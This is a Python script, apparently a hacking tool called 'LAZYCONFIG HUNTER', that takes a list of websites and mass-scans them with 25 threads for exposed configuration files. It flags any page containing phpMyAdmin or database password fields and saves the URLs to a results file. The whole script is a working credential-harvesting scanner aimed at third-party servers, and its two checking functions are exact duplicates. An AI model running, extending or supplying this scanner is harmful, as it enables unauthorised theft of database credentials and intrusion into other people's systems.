import os
import requests
import time
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style

bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

def screen_clear():
    os.system('cls')

def lazycfg(star, config_file):
    if "://" not in star:
        star = "https://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + config_file
    try:
        check = requests.get(url, headers=headers, timeout=3)
        if check.status_code == 200:
            resp = check.text
            if "pma_password" in resp or "auth[password]" in resp:
                print(f"sql {gr}OK{res} => {star}\n")
                with open("output/sqlpathOk.txt", "a") as f:
                    f.write(f'{url}\n')
            else:
                print(f"{red}Not Found{res} sql => {star}\n")
    except requests.exceptions.RequestException as e:
        print(f"{red}ERROR{res}  => {star}\n")

def lazycfg2(star, config_file):
    if "://" not in star:
        star = "https://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + config_file
    try:
        check = requests.get(url, headers=headers, timeout=3)
        if check.status_code == 200:
            resp = check.text
            if "pma_password" in resp or "auth[password]" in resp:
                print(f"sql {gr}OK{res} => {star}\n")
                with open("output/sqlpathOk.txt", "a") as f:
                    f.write(f'{url}\n')
            else:
                print(f"{red}Not Found{res} sql => {star}\n")
    except requests.exceptions.RequestException as e:
        print(f"{red}ERROR{res}  => {star}\n")

def filter(star, config_file):
    lazycfg(star, config_file)
    lazycfg2(star, config_file)

def main():
    print(f'{gr}[ LAZYCONFIG  HUNTER ] | [ BY EsevenB ]')
    list_file = input(f"{gr}Give Me Your List.txt/{red}ENC0D3R> {gr}${res} ")
    with open(list_file, 'r') as f:
        star = f.readlines()

    with open("path/sqlcfg.txt", 'r') as f:
        config_file = f.read().strip()
    with open("path/sqlcfg2.txt", 'r') as f:
        config_file2 = f.read().strip()

    try:
        with ThreadPool(25) as pool:
            pool.starmap(filter, [(star_item, config_file) for star_item in star])
            pool.starmap(filter, [(star_item, config_file2) for star_item in star])
    except:
        pass

if __name__ == '__main__':
    screen_clear()
    main()
